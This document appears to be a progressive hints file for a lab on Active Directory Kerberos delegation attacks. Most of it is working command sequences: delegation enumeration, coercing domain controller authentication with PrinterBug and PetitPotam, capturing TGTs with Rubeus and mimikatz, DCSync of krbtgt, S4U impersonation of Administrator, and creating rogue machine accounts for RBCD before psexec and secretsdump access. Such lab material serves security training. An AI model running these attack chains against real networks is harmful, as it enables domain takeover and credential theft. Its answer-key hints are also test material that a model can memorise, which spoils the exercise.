# Delegation Attacks Hints

Progressive hints for each delegation attack task.

---

## Task 1: Enumerate Delegation Configurations

### Hint 1 (Light)
Use BloodHound to visualize delegation configurations. Pre-built queries exist for unconstrained delegation. For constrained delegation, look for `AllowedToDelegate` relationships.

### Hint 2 (Medium)
```powershell
# PowerView enumeration
Get-DomainComputer -Unconstrained
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

### Hint 3 (Heavy)
```powershell
# Complete delegation enumeration

# 1. Find Unconstrained Delegation (exclude DCs)
Get-DomainComputer -Unconstrained | Where-Object {
    $_.distinguishedname -notlike "*Domain Controllers*"
} | Select-Object dnshostname, samaccountname

# 2. Find Constrained Delegation
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, msds-allowedtodelegateto

# 3. Check for RBCD attack opportunities (GenericWrite on computers)
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.ObjectDN -like "*CN=Computers*" -and
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty"
} | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights
```

```bash
# Linux enumeration
findDelegation.py domain.local/user:password -dc-ip 192.168.1.10

# ldapsearch for unconstrained
ldapsearch -x -H ldap://dc01.domain.local -D "user@domain.local" -w 'pass' \
  -b "DC=domain,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
  sAMAccountName

# ldapsearch for constrained
ldapsearch -x -H ldap://dc01.domain.local -D "user@domain.local" -w 'pass' \
  -b "DC=domain,DC=local" "(msDS-AllowedToDelegateTo=*)" \
  sAMAccountName msDS-AllowedToDelegateTo
```

```cypher
# BloodHound queries

# Unconstrained delegation (non-DC)
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name STARTS WITH 'DC'
RETURN c.name

# Constrained delegation
MATCH (u)-[:AllowedToDelegate]->(c:Computer)
RETURN u.name, c.name

# RBCD opportunities
MATCH (u:User)-[:GenericAll|GenericWrite]->(c:Computer)
RETURN u.name, c.name
```

---

## Task 2: Unconstrained Delegation Attack

### Hint 1 (Light)
When a user authenticates to a computer with unconstrained delegation, their TGT is cached in memory. Compromise the computer, then extract or wait for valuable TGTs.

### Hint 2 (Medium)
```powershell
# Monitor for TGTs with Rubeus
.\Rubeus.exe monitor /interval:5 /targetuser:DC01$

# Or coerce authentication
# printerbug.py domain/user:pass@DC target_server
```

### Hint 3 (Heavy)
```powershell
# Complete Unconstrained Delegation attack

# === Step 1: Confirm delegation ===
Get-DomainComputer WEB01 -Properties useraccountcontrol
# Look for TRUSTED_FOR_DELEGATION (524288)

# === Step 2: On compromised server, monitor for TGTs ===
.\Rubeus.exe monitor /interval:5 /filteruser:administrator /nowrap

# === Step 3: Coerce DC authentication (from attacker machine) ===
```

```bash
# Coerce DC to authenticate to compromised server
printerbug.py domain.local/user:password@dc01.domain.local web01.domain.local

# Or use PetitPotam
petitpotam.py web01.domain.local dc01.domain.local

# Or Coercer for multiple methods
coercer coerce -u user -p password -d domain.local -t dc01.domain.local -l web01.domain.local
```

```powershell
# === Step 4: Capture the TGT (on compromised server) ===
# Rubeus will display base64 ticket
# Or manually extract:
mimikatz # sekurlsa::tickets /export
# Look for DC01$ TGT

# === Step 5: Use the TGT ===
# Inject DC's TGT
mimikatz # kerberos::ptt [ticket].kirbi

# DCSync
mimikatz # lsadump::dcsync /user:krbtgt /domain:domain.local
```

```bash
# Linux - if you got the ticket as base64 or .kirbi
ticketConverter.py dc01.kirbi dc01.ccache
export KRB5CCNAME=dc01.ccache

# DCSync with DC's credentials
secretsdump.py -k -no-pass domain.local/DC01\$@dc01.domain.local -just-dc
```

---

## Task 3: Constrained Delegation Attack

### Hint 1 (Light)
Constrained delegation uses S4U2Self and S4U2Proxy. If you control an account with constrained delegation, you can impersonate any user to the allowed services.

### Hint 2 (Medium)
```bash
# Get service ticket impersonating Administrator
getST.py -spn SERVICE/TARGET -impersonate Administrator domain/svc_account:password
```

### Hint 3 (Heavy)
```bash
# Complete Constrained Delegation attack

# === Step 1: Verify delegation ===
# svc_sql can delegate to MSSQLSvc/DB01.domain.local:1433
```

```powershell
Get-DomainUser svc_sql | Select-Object samaccountname, msds-allowedtodelegateto
```

```bash
# === Step 2: Get TGT for the delegating account ===
getTGT.py domain.local/svc_sql:password -dc-ip 192.168.1.10
export KRB5CCNAME=svc_sql.ccache

# === Step 3: S4U to impersonate Administrator ===
getST.py -spn MSSQLSvc/DB01.domain.local:1433 -impersonate Administrator \
  domain.local/svc_sql:password -dc-ip 192.168.1.10

export KRB5CCNAME=Administrator.ccache

# === Step 4: Access the service ===
mssqlclient.py -k -no-pass domain.local/Administrator@DB01.domain.local

# === Alternative: Get CIFS instead of MSSQL ===
getST.py -spn MSSQLSvc/DB01.domain.local:1433 -impersonate Administrator \
  domain.local/svc_sql:password -dc-ip 192.168.1.10 -altservice CIFS/DB01.domain.local

export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@DB01.domain.local
```

```powershell
# Using Rubeus
.\Rubeus.exe s4u /user:svc_sql /rc4:NTLM_HASH /impersonateuser:Administrator \
  /msdsspn:MSSQLSvc/DB01.domain.local:1433 /ptt

# For CIFS access
.\Rubeus.exe s4u /user:svc_sql /rc4:NTLM_HASH /impersonateuser:Administrator \
  /msdsspn:MSSQLSvc/DB01.domain.local:1433 /altservice:CIFS /ptt

dir \\DB01.domain.local\c$
```

---

## Task 4: Resource-Based Constrained Delegation (RBCD)

### Hint 1 (Light)
RBCD requires write access to the target computer's msDS-AllowedToActOnBehalfOfOtherIdentity attribute. You also need a computer account you control.

### Hint 2 (Medium)
```bash
# Create computer, set RBCD, then S4U
addcomputer.py -computer-name 'FAKE$' -computer-pass 'Pass!' domain/user:pass
rbcd.py -delegate-to 'TARGET$' -delegate-from 'FAKE$' -action write domain/user:pass
getST.py -spn CIFS/TARGET -impersonate Administrator domain/'FAKE$':'Pass!'
```

### Hint 3 (Heavy)
```bash
# Complete RBCD attack

# === Step 1: Verify write access to target computer ===
```

```powershell
Get-DomainObjectAcl WS01 -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty" -and
    $_.SecurityIdentifier -eq (Get-DomainUser currentuser).objectsid
}
```

```bash
# === Step 2: Create a computer account you control ===
addcomputer.py -computer-name 'FAKECOMP$' -computer-pass 'Password123!' \
  domain.local/user:password -dc-ip 192.168.1.10

# === Step 3: Configure RBCD - Allow FAKECOMP to delegate to WS01 ===
rbcd.py -delegate-to 'WS01$' -delegate-from 'FAKECOMP$' -action write \
  domain.local/user:password -dc-ip 192.168.1.10

# === Step 4: Get TGT for our fake computer ===
getTGT.py domain.local/'FAKECOMP$':'Password123!' -dc-ip 192.168.1.10
export KRB5CCNAME=FAKECOMP\$.ccache

# === Step 5: S4U - Impersonate Administrator to WS01 ===
getST.py -spn CIFS/WS01.domain.local -impersonate Administrator \
  domain.local/'FAKECOMP$':'Password123!' -dc-ip 192.168.1.10

export KRB5CCNAME=Administrator.ccache

# === Step 6: Access target ===
psexec.py -k -no-pass domain.local/Administrator@WS01.domain.local
# or
smbclient //WS01.domain.local/c$ -k -no-pass
# or
secretsdump.py -k -no-pass domain.local/Administrator@WS01.domain.local
```

```powershell
# PowerShell/Rubeus method

# Step 2: Create computer with PowerMad
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount FAKECOMP -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Step 3: Set RBCD
$fakeSid = (Get-DomainComputer FAKECOMP).objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$fakeSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer WS01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Step 4-5: S4U with Rubeus
.\Rubeus.exe hash /password:Password123! /user:FAKECOMP$ /domain:domain.local
# Get the rc4_hmac hash

.\Rubeus.exe s4u /user:FAKECOMP$ /rc4:COMPUTED_HASH /impersonateuser:Administrator \
  /msdsspn:CIFS/WS01.domain.local /ptt

# Step 6: Access
dir \\WS01.domain.local\c$
```

---

## Troubleshooting Hints

### KDC_ERR_BADOPTION
```
S4U2Proxy failed. Check:
1. Is constrained delegation configured correctly?
2. For RBCD, is msDS-AllowedToActOnBehalfOfOtherIdentity set?
3. Is the target user protected?
```

### Target user cannot be impersonated
```
User might be:
1. In "Protected Users" group
2. Has "Account is sensitive and cannot be delegated" flag
Try impersonating a different user
```

### Machine Account Quota reached
```bash
# Check quota
Get-ADObject ((Get-ADDomain).DistinguishedName) -Properties ms-DS-MachineAccountQuota
# Default is 10, might be 0

# Alternative: Use existing computer you've compromised instead of creating new one
```

### Time sync issues
```bash
sudo ntpdate dc01.domain.local
```

---

## Common Mistakes

1. **Forgetting to export KRB5CCNAME** - Impacket tools need this set
2. **Wrong SPN format** - Must match exactly (case can matter)
3. **Protected Users** - Cannot impersonate members
4. **Missing computer account** - RBCD requires computer you control
5. **Targeting wrong computer** - Verify you're attacking intended target
6. **Cleanup** - Remove RBCD config after testing in production

---

## Quick Reference

### Enumeration
```
findDelegation.py DOMAIN/user:pass              # All delegation types
Get-DomainComputer -Unconstrained               # Unconstrained
Get-DomainUser -TrustedToAuth                   # Constrained
```

### Unconstrained
```
printerbug.py DOMAIN/user:pass@DC compromised_server
Rubeus.exe monitor /interval:5
mimikatz # sekurlsa::tickets /export
```

### Constrained
```
getST.py -spn SPN -impersonate User DOMAIN/svc:pass
export KRB5CCNAME=User.ccache
psexec.py -k -no-pass DOMAIN/User@TARGET
```

### RBCD
```
addcomputer.py -computer-name 'FAKE$' -computer-pass 'Pass!' DOMAIN/user:pass
rbcd.py -delegate-to 'TARGET$' -delegate-from 'FAKE$' -action write DOMAIN/user:pass
getST.py -spn CIFS/TARGET -impersonate Administrator DOMAIN/'FAKE$':'Pass!'
psexec.py -k -no-pass DOMAIN/Administrator@TARGET
```
